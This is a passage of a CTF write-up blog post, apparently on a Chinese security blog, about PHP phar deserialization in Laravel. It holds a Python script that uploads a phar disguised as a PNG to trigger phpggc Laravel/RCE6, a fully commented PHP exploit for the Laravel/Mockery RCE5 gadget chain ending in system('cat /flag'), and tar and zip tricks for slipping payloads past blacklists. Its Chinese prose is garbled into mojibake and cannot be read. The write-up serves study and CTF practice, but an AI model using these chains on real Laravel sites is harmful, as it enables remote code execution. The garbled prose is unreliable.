coding=utf-8 -*-</span><br><span class="line"># Author:Crispr</span><br><span class="line"># Ê≥®ÊÑèÊîæÂú®phpggcÊ†πÁõÆÂΩïËøêË°å</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = &quot;http://b6a64602-069f-454e-a440-bfa1cfa72d57.node3.buuoj.cn/&quot;</span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">def create_gzfile():</span><br><span class="line">    cmd = r&quot;&quot;&quot;php -d&#x27;readonly=0&#x27; ./phpggc Laravel/RCE6 &quot;system(&#x27;whoami&#x27;);&quot; --phar phar &gt; crispr.phar&quot;&quot;&quot;</span><br><span class="line">    os.system(cmd)</span><br><span class="line">    cmd = r&quot;gzip crispr.phar&quot;</span><br><span class="line">    os.system(cmd)</span><br><span class="line">    cmd = r&quot;mv crispr.phar.gz crispr.phar.png&quot;</span><br><span class="line">    os.system(cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_upload_png_path():</span><br><span class="line">    files = &#123;&quot;file&quot; : (&quot;crispr.phar.png&quot; , open(&quot;./crispr.phar.png&quot;,&quot;rb+&quot;),&quot;image/png&quot;)&#125;</span><br><span class="line">    r = session.post(url,files=files)</span><br><span class="line">    if r.status_code == 200:</span><br><span class="line">        text = r.text</span><br><span class="line">        #print(text)</span><br><span class="line">        path = re.findall(&#x27;path: (.*?)\.png&#x27;,text)[0]</span><br><span class="line">        #print(path)</span><br><span class="line">        return path</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;upload false&quot;)</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">def deserialize(path):</span><br><span class="line">    url1 = url + &quot;image?image=phar://../storage/app/&quot; + path + &quot;.png&quot;</span><br><span class="line">    print(url1)</span><br><span class="line">    r = session.get(url1)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    create_gzfile()</span><br><span class="line">    path = get_upload_png_path()</span><br><span class="line">    print(path)</span><br><span class="line">    deserialize(path)</span><br><span class="line">    os.unlink(&quot;crispr.phar.png&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="Ë∑üËøõ‰∏Ä‰∏ãphpggc-laravel-rce5ÁöÑÈìæÂ≠ê"><a href="#Ë∑üËøõ‰∏Ä‰∏ãphpggc-laravel-rce5ÁöÑÈìæÂ≠ê" class="headerlink" title="Ë∑üËøõ‰∏Ä‰∏ãphpggc laravel rce5ÁöÑÈìæÂ≠ê"></a>Ë∑üËøõ‰∏Ä‰∏ãphpggc laravel rce5ÁöÑÈìæÂ≠ê</h2><p>Ëøô‰∏™ÈìæÂ≠êÂÆûÈôÖ‰∏äÊòØLaravelÊ°ÜÊû∂‰∏≠<strong>mockeryÁªÑ‰ª∂</strong>ÁöÑÊºèÊ¥û</p>
<p>ÂÖ•Âè£Âú®PendingBroadcast.phpÁöÑ__destruct</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128150722137.png" alt="image-20211128150722137" loading="lazy"></p>
<p>ÂèØ‰ª•Ë∞ÉÁî®‰ªªÊÑèÁ±ªÁöÑdispachÊñπÊ≥ï</p>
<p>ËøôÈáåÈÄâÁî®‰∫Üdispatcher.php</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128150952069.png" alt="image-20211128150952069" loading="lazy"></p>
<p>Êàë‰ª¨ÈúÄË¶ÅÁöÑÊòØ<code>$this-&gt;dispatchToQueue</code>Ëøô‰∏™ÊñπÊ≥ïÔºåÂ∞±Ë¶Å‰ΩøÂâç‰∏§‰∏™Êù°‰ª∂ÂùáÊàêÁ´ãÔºåËÄåÂêéÊñá‰ºöÂàÜÊûêthis-&gt;queueResolverÂèØÊéßÔºåÂÖàË∑üËøõ‰∏Ä‰∏ãcommandShouldBequeued</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128151614038.png" alt="image-20211128151614038" loading="lazy"></p>
<p>$commandÈúÄË¶Å‰∏∫ÂÆûÁé∞ShouldQueueÊé•Âè£ÁöÑÂÆû‰æãÔºåËøôÈáå‰ΩøÁî®‰∫ÜBroadCastEvent.php</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128151728252.png" alt="image-20211128151728252" loading="lazy"></p>
<p>ÂõûÂà∞ÂÖàÂâçÁöÑÈúÄË¶ÅÊª°Ë∂≥‰∏§‰∏™IFÊù°‰ª∂ÂêéÂà©Áî®ÁöÑÊñπÊ≥ïdispatchToQueue</p>
<p>Ë∑üËøõ‰∏Ä‰∏ã</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128151045404.png" alt="image-20211128151045404" loading="lazy"></p>
<p>ÂèØ‰ª•ÁúãÂà∞Ê≠§Â§ÑË∞ÉÁî®‰∫Ücall_user_funcÔºåÂ¶ÇÊûú‰∏§‰∏™ÂèÇÊï∞ÈÉΩÂèØÊéßÂ∞±ÂèØ‰ª•ÂÆûÁé∞ÂëΩ‰ª§ÊâßË°å„ÄÇ</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128151131963.png" alt="image-20211128151131963" loading="lazy"></p>
<p>Áúã‰∏Ä‰∏ãÊûÑÈÄ†ÂáΩÊï∞ÔºåÂèëÁé∞$this-&gt;queueResolverÂèØÊéß</p>
<p>ËÄå$connectionÊòØ$commandÁöÑÊàêÂëòÔºå$commandÂèØÊéßÔºåÂàô$connection‰πüÂèØÊéßÔºåÊâÄ‰ª•Ê≠§Â§ÑÂ∞±ÂèØ‰ª•ÂÆûÁé∞ÂëΩ‰ª§ÊâßË°å</p>
<p>ÂÖ®Â±ÄÊêúÁ¥¢‰∏Ä‰∏ãevalÊñπÊ≥ïÔºåÂèëÁé∞Â≠òÂú®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class EvalLoader implements Loader</span><br><span class="line">&#123;</span><br><span class="line">    public function load(MockDefinition $definition)</span><br><span class="line">    &#123;</span><br><span class="line">        if (class_exists($definition-&gt;getClassName(), false)) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        eval(&quot;?&gt;&quot; . $definition-&gt;getCode());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ËØ•EvalLoaderÁ±ªÁöÑloadÊñπÊ≥ïÂ≠òÂú®<code>eval()</code></p>
<p>call_user_funcÂáΩÊï∞Âú®Á¨¨‰∏Ä‰∏™ÂèÇÊï∞‰∏∫Êï∞ÁªÑÁöÑÊó∂ÂÄôÔºåÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞Â∞±ÊòØÊàë‰ª¨ÈÄâÊã©ÁöÑÁ±ªÔºåÁ¨¨‰∫å‰∏™ÂèÇÊï∞ÊòØÁ±ª‰∏ãÁöÑÊñπÊ≥ïÔºõÊâÄ‰ª•ËøôÈáåÁõ¥Êé•ÂéªÂà∞EvalLoaderÁ±ªÔºåÂéªÊâßË°åloadÊñπÊ≥ï‰ªéËÄåË∞ÉÁî®Âà∞evalÂáΩÊï∞ÔºõËøôÈáåÂèëÁé∞Â≠òÂú®ÂèÇÊï∞ÔºåËÄå‰∏îÂèÇÊï∞ÂøÖÈ°ªÊòØMockDefinitionÁ±ªÁöÑÂÆû‰æã,‰πüÂç≥ÊòØÊÑèÂë≥ÁùÄÊàë‰ª¨connectionÈúÄË¶Å‰∏∫MockDefinitionÁ±ªÁöÑÂÆû‰æã,Âπ∂‰∏îË¶ÅÊâßË°å<code>eval</code>,ÂøÖÈ°ª‰ΩøÂæó<code>if</code>ËøîÂõû<code>false</code></p>
<p>Êé•ËøΩÊ∫ØÂà∞MockDefinitionÁ±ª:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public function __construct(MockConfiguration $config, $code)</span><br><span class="line">    &#123;</span><br><span class="line">        if (!$config-&gt;getName()) &#123;</span><br><span class="line">            throw new \InvalidArgumentException(&quot;MockConfiguration must contain a name&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;config = $config;</span><br><span class="line">        $this-&gt;code = $code;</span><br><span class="line">    &#125;</span><br><span class="line">public function getClassName()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;config-&gt;getName();</span><br><span class="line">    &#125;</span><br><span class="line">public function getCode()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;code;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ÂÖ®Â±ÄÊêúÁ¥¢<code>getName()</code>ÊñπÊ≥ïÔºåÂπ∂‰∏îÂÆûÁé∞<code>MockConfiguration</code>Êé•Âè£,ÊâæÂà∞‰∫Ü<code>MockConfiguration.php</code>‰∏≠:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function getName()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;name;  //$this-&gt;nameÊòØÂèØÊéßÁöÑ</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>Âõ†Ê≠§ÂΩìÊàë‰ª¨‰ΩøÂæó<code>$this-&gt;config</code>‰∏∫ËØ•Á±ªÊó∂ÔºåÈÇ£‰πàË∞ÉÁî®getNameËÉΩÂ§üËøîÂõû‰ªªÊÑèÂÄºÔºå‰ªéËÄå‰ΩøÂæóËØ•‰ªªÊÑèÂÄºÁªÑÊàêÁöÑÁ±ª‰∏çÂ≠òÂú®ËÄåË∞ÉÁî®eval,ËÄå<code>$this-&gt;code</code>Â∞±ÊòØÊãºÊé•Âú®<code>eval</code>‰∏≠ÁöÑÂëΩ‰ª§</p>
<h3 id="phpggc-laravel-rce5-exp"><a href="#phpggc-laravel-rce5-exp" class="headerlink" title="phpggc laravel rce5 exp"></a>phpggc laravel rce5 exp</h3><p>ÊëòËá™ÁΩë‰∏ä</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace Illuminate\Broadcasting&#123;</span><br><span class="line">    use Illuminate\Contracts\Events\Dispatcher;</span><br><span class="line">    class PendingBroadcast</span><br><span class="line">    &#123;</span><br><span class="line">        protected $event;</span><br><span class="line">        //__destructÊûêÊûÑÊñπÊ≥ïÊòØË∞ÉÁî®$this-&gt;eventsÁ±ªÁöÑdispatchÊñπÊ≥ïÔºåËøôÈáåÊòØË∞ÉÁî®DispatcherÁ±ªÁöÑdispatchÊñπÊ≥ï</span><br><span class="line">        protected $events;</span><br><span class="line">        public function __construct($events, $event)</span><br><span class="line">        &#123;</span><br><span class="line">        //eventÊòØdispatchÊñπÊ≥ïÁöÑÂèÇÊï∞,‰πüÂ∞±ÊòØ$command,ËÄå$commandÈúÄË¶ÅÂÆûÁé∞ShouldQueueÊé•Âè£,Âõ†Ê≠§ËøôÈáå$eventÊòØÈÄâÊã©BroadcastEventÁ±ª</span><br><span class="line">        $this-&gt;event = $event;</span><br><span class="line">        $this-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Illuminate\Broadcasting&#123;</span><br><span class="line">    class BroadcastEvent&#123;</span><br><span class="line">        //ËøôÈáå$connection‰Ωú‰∏∫call_user_funcÁöÑÁ¨¨‰∫å‰∏™ÂèÇÊï∞Ôºå‰πüÂ∞±ÊòØÈùôÊÄÅÁ±ªEvalLoader‰∏≠load()ÊñπÊ≥ïÁöÑÂèÇÊï∞Ôºå‰πüÂ∞±ÊòØ$definition</span><br><span class="line">        public $connection;</span><br><span class="line">        public function __construct($connection)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;connection = $connection;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Illuminate\Bus&#123;</span><br><span class="line">    class Dispatcher</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        public function __construct($queueResolver)</span><br><span class="line">        &#123;</span><br><span class="line">            //queueResolverÊòØÂêéÁª≠call_user_func_array()ÁöÑÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÔºåËøôÈáåÊàë‰ª¨ÈúÄË¶ÅË∞ÉÁî®ÈùôÊÄÅÁ±ªÊñπÊ≥ïÊâßË°åeval</span><br><span class="line">            $this-&gt;queueResolver = $queueResolver;</span><br><span class="line">        &#125;</span><br><span class="line">        //$commandÈúÄË¶ÅÂÆûÁé∞ShouldQueueÊé•Âè£Êó∂commandShouldBeQueuedÊñπÊ≥ïÊâç‰ºöËøîÂõûÁúüÔºåËøôÈáå‰ΩøÁî®BroadcastEventÁ±ª</span><br><span class="line">        public function dispatch($command)</span><br><span class="line">        &#123;</span><br><span class="line">            //ÈúÄË¶Å‰Ωø‰∏âÁõÆËøêÁÆóÁ¨¶ÁöÑÂà§Êñ≠Âºè‰∏∫ÁúüÔºåÊâçËÉΩË∞ÉÁî®dispatchToQueueÊñπÊ≥ïËøõËÄåË∞ÉÁî®call_user_func_array</span><br><span class="line">            return $this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command)</span><br><span class="line">                        ? $this-&gt;dispatchToQueue($command)</span><br><span class="line">                        : $this-&gt;dispatchNow($command);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Mockery\Loader&#123;</span><br><span class="line">    use Mockery\Generator\MockDefinition;</span><br><span class="line">    class EvalLoader</span><br><span class="line">    &#123;</span><br><span class="line">        //ËøôÈáå$definitionÈúÄË¶ÅÂÆûÁé∞MockDefinitionÊé•Âè£ÔºåÂõ†Ê≠§ÈÄâÂèñÁöÑÊòØMockDefinitionÁ±ª</span><br><span class="line">        public function load(MockDefinition $definition)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Mockery\Generator&#123;</span><br><span class="line">    class MockDefinition</span><br><span class="line">    &#123;</span><br><span class="line">        protected $config;</span><br><span class="line">        protected $code;</span><br><span class="line">        //ËøôÈáå$this-&gt;configËÆæÁΩÆ‰∏∫MockConfigurationÁ±ªÔºåÂÖ∂getnameÊñπÊ≥ïÂíåÂèÇÊï∞ÂèØÊéßËÉΩÂ§üÂæóÂà∞‰ªªÊÑèÂ≠óÁ¨¶‰Ωú‰∏∫getClassName()ÁöÑËøîÂõûÂÄº</span><br><span class="line">        public function __construct($config, $code)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;config = $config;</span><br><span class="line">            //$this-&gt;code ‰Ωú‰∏∫EvalLoaderÁ±ª‰∏≠loadÊñπÊ≥ï‰∏≠eval()ÁöÑÊãºÊé•ÂèÇÊï∞Ôºå‰πüÂ∞±ÊòØÊàë‰ª¨ÈúÄË¶ÅÂÆûÁé∞ÂëΩ‰ª§ÊâßË°åÁöÑÂú∞Êñπ</span><br><span class="line">            $this-&gt;code = $code;    </span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Mockery\Generator&#123;</span><br><span class="line">    class MockConfiguration&#123;</span><br><span class="line">        protected $name;</span><br><span class="line">        public function __construct($name)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;name = $name;   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace&#123;</span><br><span class="line">    //ÂÖà‰ΩøÂæó$this-&gt;nameËøîÂõûcrispr,ËøôÊ†∑Ë∞ÉÁî®class_exists()Êó∂Ê≤°ÊúâcrisprÁ±ªËÇØÂÆö‰ºöËøîÂõûfalse</span><br><span class="line">    $mockconfiguration = new Mockery\Generator\MockConfiguration(&quot;crispr&quot;);</span><br><span class="line">    //‰ΩøÂæó$this-&gt;config‰∏∫MockConfigurationÁ±ªÂêéË∞ÉÁî®getnameÊñπÊ≥ï,ÂêéÈù¢‰∏∫evalÁöÑÊãºÊé•ÂèÇÊï∞ÔºåËøôÈáåÂÜô‰∏™‰∏ÄÂè•ËØù</span><br><span class="line">    $mockdefinition = new \Mockery\Generator\MockDefinition($mockconfiguration,&#x27;&lt;?php echo system(&quot;cat /flag&quot;);?&gt;&#x27;);</span><br><span class="line">    $evalloader = new \Mockery\Loader\EvalLoader();</span><br><span class="line">    //MockDefinitionÁ±ªÂÆûÁé∞‰∫ÜMockDefinitionÊé•Âè£‰Ωú‰∏∫loadÊñπÊ≥ïÁöÑÂèÇÊï∞</span><br><span class="line">    $broadcastevent = new Illuminate\Broadcasting\BroadcastEvent($mockdefinition);</span><br><span class="line">    //ËØ•dispatcherË∞ÉÁî®EvalLoaderÁöÑloadÊñπÊ≥ï</span><br><span class="line">    $dispatcher = new Illuminate\Bus\Dispatcher(array($evalloader,&quot;load&quot;));</span><br><span class="line">    //Á¨¨‰∏Ä‰∏™ÂèÇÊï∞‰∏∫Ë∞ÉÁî®DispatcherÁ±ªÁöÑdispactÊñπÊ≥ï,Á¨¨‰∫å‰∏™ÂèÇÊï∞ÊòØÂÆûÁé∞ShouldQueueÁöÑ$command</span><br><span class="line">    $exp = new Illuminate\Broadcasting\PendingBroadcast($dispatcher,$broadcastevent);</span><br><span class="line"></span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //ËÆæÁΩÆstubÔºåÂ¢ûÂä†gifÊñá‰ª∂Â§¥</span><br><span class="line">    $phar-&gt;setMetadata($exp); //Â∞ÜËá™ÂÆö‰πâmeta-dataÂ≠òÂÖ•manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //Ê∑ªÂä†Ë¶ÅÂéãÁº©ÁöÑÊñá‰ª∂</span><br><span class="line">    //Á≠æÂêçËá™Âä®ËÆ°ÁÆó</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Áî±unser-nameÂíåtinypngÊî∂Ëé∑ÁöÑÊÄªÁªì"><a href="#Áî±unser-nameÂíåtinypngÊî∂Ëé∑ÁöÑÊÄªÁªì" class="headerlink" title="Áî±unser_nameÂíåtinypngÊî∂Ëé∑ÁöÑÊÄªÁªì"></a>Áî±unser_nameÂíåtinypngÊî∂Ëé∑ÁöÑÊÄªÁªì</h2><p>ÁîüÊàêÂÆåpharÂÜçÊâßË°ågzip phar.pharÊàñËÄÖbzip2 phar.phar</p>
<p>ÊïàÊûúÂ¶Ç‰∏ã„ÄÇÂèØ‰ª•ËøáÈªëÂêçÂçïÊ£ÄÊµã<br><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128152813712.png" alt="image-20211128152813712" loading="lazy"></p>
<p>Â∞ÜÂ∫èÂàóÂåñÁöÑÊï∞ÊçÆÂÜôÂÖ•.phar/.metadataXXXX‰∏≠ÔºåÂÜçÂõûÈÄÄ‰∏ä‰∏ÄÁ∫ßÊâßË°å</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cvf test.tar .phar/</span><br></pre></td></tr></table></figure>

<p>ÂÜçÁî®pharÂçèËÆÆËß£ÊûêÂØπÂ∫îÁöÑtarÂåÖ‰πüÂèØ‰ª•Ëß¶ÂèëÂèçÂ∫èÂàóÂåñ</p>
<p><strong>Zip:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$a=serialize(new a());</span><br><span class="line">$zip = new ZipArchive;</span><br><span class="line">$res = $zip-&gt;open(&#x27;test.zip&#x27;, ZipArchive::CREATE);</span><br><span class="line">$zip-&gt;addFromString(&#x27;test.txt&#x27;, &#x27;file content goes here&#x27;);</span><br><span class="line">$zip-&gt;setArchiveComment($a);</span><br><span class="line">$zip-&gt;close();</span><br></pre></td></tr></table></figure>

<p>‰∏çËøázipÁöÑÊ≥®ÈáäÈáå‰∏çËÉΩÊúâ00.È´òÁâàÊú¨ÂèØ‰ª•Áî®Â§ßÂÜôSÔºå16ËøõÂà∂ÊõøÊç¢%00„ÄÇÊ≥®ÊÑèÂëΩÂêçÁ©∫Èó¥Á±ªÁöÑ\Âíå16ËøõÂà∂ÁöÑ\ÂÜ≤Á™Å„ÄÇ<br>Ëß£ÂÜ≥Ôºö\ÊõøÊç¢\5c<br>Âà´Êää‰∏çÊòØSÈáåÁöÑ\‰πüÊõøÊç¢‰∫ÜÂì¶„ÄÇ</p>
<h2 id="‰ªéÊ∫êÁ†ÅËßíÂ∫¶Áúãphar‰∏∫‰ªÄ‰πàËÉΩËß£ÊûêËøôÂá†Á±ªÂéãÁº©ÂåÖ"><a href="#‰ªéÊ∫êÁ†ÅËßíÂ∫¶Áúãphar‰∏∫‰ªÄ‰πàËÉΩËß£ÊûêËøôÂá†Á±ªÂéãÁº©ÂåÖ" class="headerlink" title="‰ªéÊ∫êÁ†ÅËßíÂ∫¶Áúãphar‰∏∫‰ªÄ‰πàËÉΩËß£ÊûêËøôÂá†Á±ªÂéãÁº©ÂåÖ"></a>‰ªéÊ∫êÁ†ÅËßíÂ∫¶Áúãphar‰∏∫‰ªÄ‰πàËÉΩËß£ÊûêËøôÂá†Á±ªÂéãÁº©ÂåÖ</h2><p><a target="_blank" rel="noopener" href="https://gywbd.github.io/posts/2016/2/zend-execution-engine.html">Ê∑±ÂÖ•ÁêÜËß£ZendÊâßË°åÂºïÊìéÔºàPHP5Ôºâ - GongYong (gywbd.github.io)</a></p>
<p>ÁÆóÊòØÂâçÁΩÆÁü•ËØÜÔºåÁé∞Âú®Âü∫Êú¨Áúã‰∏çÊáÇÔºåÊó•ÂêéÂÜçÊù•„ÄÇ</p>
<p>‰ªéÊ∫êÁ†ÅËßíÂ∫¶ÂàÜÊûê</p>
<p><a target="_blank" rel="noopener" href="https://guokeya.github.io/post/uxwHLckwx/">‰ªéËôéÁ¨¶Á∫ø‰∏ãCTFÊ∑±ÂÖ•ÂèçÂ∫èÂàóÂåñÂà©Áî® | (guokeya.github.io)</a></p>
<p>ËØÜÂà´Êñá‰ª∂Â§¥ÔºåËØÜÂà´Êñá‰ª∂Âêç„ÄÇ</p>
<p>debugÊèí‰ª∂Ê≤°Êï¥ÊòéÁôΩÔºåÊöÇÊó∂ÂÖà‰∏çË∑ü‰∫Ü„ÄÇ</p>
<h2 id="end"><a href="#end" class="headerlink" title="end"></a><strong>end</strong></h2></div><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>th0me</li><li class="post-copyright-link"><strong>Post link: </strong><a href="http://example.com/2021/11/28/unser_name/" title="thinkphp5.0.23rce">http://example.com/2021/11/28/unser_name/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> unless otherwise stated.</li></ul></section></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/2021/11/24/thinkphp5.0.23rce/" rel="next" title="thinkphp5.0.23rce"><span class="post-nav-text">thinkphp5.0.23rce</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>Ëã•ÊÇ®ÊÉ≥ÂèäÊó∂ÂæóÂà∞ÂõûÂ§çÊèêÈÜíÔºåÂª∫ËÆÆË∑≥ËΩ¨ GitHub Issues ËØÑËÆ∫„ÄÇ</span><br><span>Ëã•Ê≤°ÊúâÊú¨Êñá IssueÔºåÊÇ®ÂèØ‰ª•‰ΩøÁî® Comment Ê®°ÁâàÊñ∞Âª∫„ÄÇ</span><br></div><style>.utterances {
  max-width: 100%;
}</style><script src="https://utteranc.es/client.js" repo="th0me/github.io.comment" issue-term="pathname" theme="github-light" crossorigin="anonymous" async></script></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 ‚Äì 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> th0me</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v5.4.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.7.0</span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#B9897F" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="Search"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="Searching..." value=""></div><div id="local-search-result"></div></div></div></body></html>